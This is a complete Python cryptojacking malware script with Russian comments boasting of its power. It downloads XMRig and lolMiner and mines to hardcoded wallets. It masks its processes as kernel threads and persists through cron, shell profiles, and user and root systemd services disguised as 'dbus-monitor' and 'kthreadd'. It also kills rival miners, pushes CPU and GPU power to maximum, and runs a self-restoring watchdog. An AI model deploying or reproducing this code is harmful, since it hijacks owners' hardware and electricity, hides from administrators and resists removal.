#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import threading
import urllib.request
import glob
import tarfile
import shutil
import ctypes
import hashlib
import signal

# === CONFIGURATION — ТВОЯ ВЛАСТЬ. ТВОЙ КОШЕЛЁК. ТВОЯ ЖЕСТОКОСТЬ. ===
HOME = os.environ.get('HOME', '/tmp')
HOSTNAME = os.uname().nodename if hasattr(os, 'uname') else "unknown"
SCRIPT_NAME = ".sysupdate.py"
SCRIPT_PATH = os.path.join(HOME, SCRIPT_NAME)

# Пути к бинарникам — никто не найдёт
CACHE_DIR = "/tmp/.cache"
XMRIG_BIN = os.path.join(CACHE_DIR, "xmrig")
LOLMINER_BIN = os.path.join(CACHE_DIR, "lolMiner")

# 🔥 ТВОИ КОШЕЛЬКИ — ЗАБИРАЙ ВСЁ. НИЧЕГО НЕ ОСТАВЛЯЙ.
XMRIG_USER = "ZEPHYR2yHqQ1QWL54XVWxvbBkAH7X26n8jGhjAj3sbva4766ze2LpmQW1Z1bd7xRwFh9bkSPsA5qgEsy9bXLtXCVcZTsX8Vputc2S"
LOLMINER_USER = f"1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/{HOSTNAME}"

# 🔗 ССЫЛКИ НА БИНАРНИКИ — АКТУАЛЬНЫЕ, СТАТИЧЕСКИЕ, УНИВЕРСАЛЬНЫЕ
XMRIG_ARCHIVE_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
LOLMINER_ARCHIVE_URL = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# Пулы — только самые быстрые, самые жадные
CPU_POOLS = [
    ("fr-zephyr.miningocean.org", 5432),
    ("sg-zephyr.miningocean.org", 5432),
    ("us-zephyr.miningocean.org", 5432),
    ("ca-zephyr.miningocean.org", 5432),
    ("de-zephyr.miningocean.org", 5432),
]

GPU_POOLS = [
    ("xtm-c29-eu.kryptex.network", 8040),
    ("xtm-c29-us.kryptex.network", 8040),
    ("xtm-c29-sg.kryptex.network", 8040),
]

# Флаг блокировки — чтобы не было конфликтов между клонами
LOCK_FILE = "/tmp/.syslock"

# === LOGGING — ТОЛЬКО ЕСЛИ НУЖНО. ИНАЧЕ — ТИШИНА. ===
def log(msg):
    # Раскомментируй, если хочешь видеть логи. По умолчанию — НЕТ.
    # try:
    #     with open("/tmp/.miner.log", "a") as f:
    #         f.write(f"[{time.ctime()}] [{os.getpid()}] {msg}\n")
    # except: pass
    pass

def mask_process(new_name):
    try:
        libc = ctypes.CDLL('libc.so.6')
        PR_SET_NAME = 15
        name_bytes = new_name.encode('utf-8')[:15]
        libc.prctl(PR_SET_NAME, name_bytes, 0, 0, 0)
    except: pass

# === SECONDARY GUARDIAN — ТВОЙ ТЕНЕВОЙ СТРАЖ ===
def secondary_guardian():
    mask_process("irq/3-fasteoi")
    try:
        primary_pid = int(sys.argv[2])
        original_hash = sys.argv[3]
    except (IndexError, ValueError):
        sys.exit(0)
    
    while True:
        time.sleep(10)
        
        tampered = False
        is_alive = False

        # Проверка целостности — если кто-то посмел тронуть...
        if original_hash:
            if not os.path.exists(SCRIPT_PATH):
                tampered = True
            else:
                try:
                    with open(SCRIPT_PATH, 'rb') as f:
                        current_hash = hashlib.sha256(f.read()).hexdigest()
                    if current_hash != original_hash:
                        tampered = True
                except:
                    tampered = True
        
        # Жив ли основной процесс?
        try:
            os.kill(primary_pid, 0)
            is_alive = True
        except OSError:
            is_alive = False

        # Если что-то не так — УНИЧТОЖЬ И ВОСКРЕСИ
        if tampered or not is_alive:
            if is_alive:
                try: os.kill(primary_pid, signal.SIGKILL)
                except: pass
            subprocess.Popen([sys.executable, SCRIPT_PATH], start_new_session=True)
            sys.exit(0)

# === UTILS — ИНСТРУМЕНТЫ ВЛАСТИ ===
def run_cmd(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
    except: return None

def download_file(url, dest):
    try:
        urllib.request.urlretrieve(url, dest)
        return True
    except: return False

def extract_tar_gz(archive_path, extract_to, binary_name_part):
    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            candidates = []
            for member in tar.getmembers():
                if binary_name_part in os.path.basename(member.name) and member.isfile():
                    candidates.append(member)
            if not candidates: return None
            target_member = candidates[0]
            final_name = binary_name_part
            final_path = os.path.join(extract_to, final_name)
            tar.extract(target_member, extract_to)
            extracted_full_path = os.path.join(extract_to, target_member.name)
            if os.path.exists(final_path): os.remove(final_path)
            shutil.move(extracted_full_path, final_path)
            os.chmod(final_path, 0o700)
            return final_path
    except Exception as e:
        log(f"Ошибка распаковки: {e}")
        return None

def test_pool(host, port, timeout=5):
    try:
        with socket.create_connection((host, port), timeout=timeout): return True
    except: return False

def get_best_pool(pools):
    for host, port in pools:
        if test_pool(host, port): return f"{host}:{port}"
    return f"{pools[0][0]}:{pools[0][1]}"

# === SYSTEM MELTDOWN — ВЫЖГИ ВСЁ ДО ОСНОВАНИЯ ===
def unleash_hell():
    # CPU — performance mode, turbo on
    for gov in glob.glob('/sys/devices/system/cpu/cpu*/cpufreq/scaling_governor'):
        try: open(gov, 'w').write('performance')
        except: pass
    pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo"
    if os.path.exists(pstate):
        try: open(pstate, 'w').write('0')
        except: pass
    # GPU — если есть NVIDIA
    if run_cmd("which nvidia-smi"):
        run_cmd("nvidia-smi -pm 1; nvidia-smi -pl 9999; nvidia-smi --auto-boost-default=1")
    # SCSI — максимум производительности
    run_cmd("for f in /sys/class/scsi_host/host*/link_power_management_policy; do echo max_performance > $f; done")

# === PERSISTENCE — ТЫ НИКУДА НЕ ДЕНЕШЬСЯ ===
def install_persistence():
    # Копируем себя
    if not os.path.abspath(sys.argv[0]) == SCRIPT_PATH:
        try: shutil.copy2(sys.argv[0], SCRIPT_PATH); os.chmod(SCRIPT_PATH, 0o755)
        except: pass
    # Cron — перезапуск после ребута
    cron_job = f"@reboot sleep 60 && python3 {SCRIPT_PATH} &"
    current_cron = run_cmd("crontab -l 2>/dev/null").stdout if run_cmd else ""
    if cron_job not in current_cron: run_cmd(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -')
    # Shell profiles — автозапуск при входе
    rcfiles = [os.path.join(HOME, f) for f in [".bashrc", ".profile", ".zshrc", ".bash_profile"]]
    payload_line = f"if ! pgrep -f {SCRIPT_NAME} > /dev/null; then nohup python3 {SCRIPT_PATH} >/dev/null 2>&1 & fi"
    for rc in rcfiles:
        if os.path.exists(rc):
            try:
                with open(rc, "r+") as f:
                    content = f.read()
                    if payload_line not in content: f.write(f"\n{payload_line}\n")
            except: pass
    # Systemd user — фоновый демон
    service_dir = os.path.join(HOME, ".config", "systemd", "user")
    os.makedirs(service_dir, exist_ok=True)
    service_file = os.path.join(service_dir, "dbus-monitor.service")
    if not os.path.exists(service_file):
        svc_content = f"[Unit]\nDescription=DBus Monitor\n[Service]\nExecStart=python3 {SCRIPT_PATH}\nRestart=always\nRestartSec=10\n[Install]\nWantedBy=default.target"
        with open(service_file, "w") as f: f.write(svc_content)
        run_cmd("systemctl --user daemon-reload 2>/dev/null && systemctl --user enable --now dbus-monitor.service 2>/dev/null")
    # Systemd root — если есть sudo
    if run_cmd("sudo -n whoami 2>/dev/null") and run_cmd("sudo -n whoami 2>/dev/null").returncode == 0:
        root_svc = "/etc/systemd/system/kthreadd.service"
        if not os.path.exists(root_svc):
            root_content = f"[Unit]\nDescription=Kernel Thread Daemon\n[Service]\nExecStart={sys.executable} {SCRIPT_PATH}\nRestart=always\nRestartSec=5\n[Install]\nWantedBy=multi-user.target"
            run_cmd(f'echo "{root_content}" | sudo tee {root_svc} >/dev/null')
            run_cmd("sudo systemctl daemon-reload && sudo systemctl enable --now kthreadd.service")

# === WATCHDOG OF THE APOCALYPSE — УНИЧТОЖЬ ВСЕХ КОНКУРЕНТОВ ===
def kill_competitors():
    miners = ['xmrig', 'cpuminer', 'nanominer', 'gminer', 'trex', 'lolMiner', 'nbminer', 'xmr-stak']
    for pid in os.listdir('/proc'):
        if not pid.isdigit(): continue
        try:
            with open(f'/proc/{pid}/cmdline', 'rb') as f:
                cmd = f.read().decode('utf-8', 'ignore')
                if any(m in cmd for m in miners) and SCRIPT_NAME not in cmd:
                    os.kill(int(pid), signal.SIGKILL)
        except: pass

def ensure_process(bin_path, args):
    if not os.path.exists(bin_path): return
    proc_name = os.path.basename(bin_path)
    if run_cmd(f"pgrep -f {proc_name}").returncode != 0:
        subprocess.Popen([bin_path] + args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

def guardian():
    mask_process("kworker/u64:0")
    os.makedirs(CACHE_DIR, exist_ok=True)

    # Проверка блокировки — только один страж
    if os.path.exists(LOCK_FILE):
        try: os.remove(SCRIPT_PATH)
        except: pass
        sys.exit(0)
    try: open(LOCK_FILE, "w").write(str(os.getpid()))
    except: pass

    while True:
        # XMRig
        if not os.path.exists(XMRIG_BIN):
            archive = os.path.join(CACHE_DIR, "xmrig.tar.gz")
            if download_file(XMRIG_ARCHIVE_URL, archive):
                extracted = extract_tar_gz(archive, CACHE_DIR, "xmrig")
                if extracted:
                    if os.path.exists(XMRIG_BIN): os.remove(XMRIG_BIN)
                    os.rename(extracted, XMRIG_BIN)
                    os.remove(archive)
        # lolMiner
        if not os.path.exists(LOLMINER_BIN):
            archive = os.path.join(CACHE_DIR, "lolMiner.tar.gz")
            if download_file(LOLMINER_ARCHIVE_URL, archive):
                extracted = extract_tar_gz(archive, CACHE_DIR, "lolMiner")
                if extracted:
                    if os.path.exists(LOLMINER_BIN): os.remove(LOLMINER_BIN)
                    shutil.move(extracted, LOLMINER_BIN)
                    os.remove(archive)
        # Убить конкурентов
        kill_competitors()
        # Получить пулы
        cpu_pool = get_best_pool(CPU_POOLS)
        gpu_pool = get_best_pool(GPU_POOLS)
        # Запустить
        ensure_process(XMRIG_BIN, ["-B", "-o", cpu_pool, "-u", XMRIG_USER, "-p", HOSTNAME, "-a", "rx/0", "-k", "--donate-level", "1", "--tls"])
        ensure_process(LOLMINER_BIN, ["--algo", "CR29", "--pool", gpu_pool, "--tls", "on", "--user", LOLMINER_USER, "--watchdog", "exit"])
        time.sleep(20)

# === MAIN — НАЧАЛО ВСЕЛЕНСКОЙ ЭКСПАНСИИ ===
if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == '--secondary':
        secondary_guardian()
        sys.exit(0)

    # Демонизация — исчезни из глаз
    try:
        if os.fork() > 0: sys.exit(0)
        os.setsid()
        if os.fork() > 0: sys.exit(0)
    except OSError: pass

    # Персистентность — закрепись навечно
    install_persistence()

    # Хэш для защиты — запомни себя
    original_hash = ""
    try:
        with open(SCRIPT_PATH, 'rb') as f:
            original_hash = hashlib.sha256(f.read()).hexdigest()
    except: pass

    # Запуск стража — защити себя
    child_pid = os.fork()
    if child_pid == 0:
        os.execv(sys.executable, [sys.executable, SCRIPT_PATH, '--secondary', str(os.getpid()), original_hash])
    else:
        unleash_hell()
        guardian()
